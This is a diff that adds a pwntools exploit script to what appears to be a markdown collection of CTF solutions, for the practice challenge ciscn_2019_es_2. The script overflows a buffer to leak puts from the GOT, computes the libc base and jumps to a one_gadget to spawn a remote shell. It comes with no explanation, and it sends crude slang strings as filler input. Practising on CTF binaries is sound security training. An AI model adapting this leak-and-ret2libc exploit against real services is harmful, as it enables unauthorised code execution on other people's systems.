@@ -409,7 +409,39 @@ icon: icon-html
   r.interactive()
   ```
 
-* 
+* ### ciscn_2019_es_2
+
+  ```python
+  from pwn import *
+  r = remote('pwn.buuoj.cn',20174)
+  #context.log_level = 'debug'
+  elf = ELF('./ciscn_2019_es_2')
+  libc = ELF('./x86_libc.so.6')
+  main = 0x80485ff
+  puts_got = elf.got['puts']
+  puts_libc = libc.symbols['puts']
+  call_puts = 0x804861D
+  
+  payload = 'a'*0x20+p32(puts_got)+'b'*8+p32(main)
+  r.sendline('nmsl')
+  r.sendline(payload)
+  payload = 'a'*0x20+p32(puts_got)+'b'*8+p32(call_puts)
+  r.sendline('fuck')
+  r.recvuntil('Hello, ')
+  r.send(payload)
+  r.recvuntil(payload)
+  r.recv(25)
+  libc_base = u32(r.recv(4)) - puts_libc
+  log.success(hex(libc_base))
+  one = libc_base + 0x3a80c
+  
+  payload = 'a'*0x2c+p32(one)
+  r.sendline('wdnmd')
+  r.sendline(payload)
+  r.interactive()
+  ```
+
+  
 
 
 
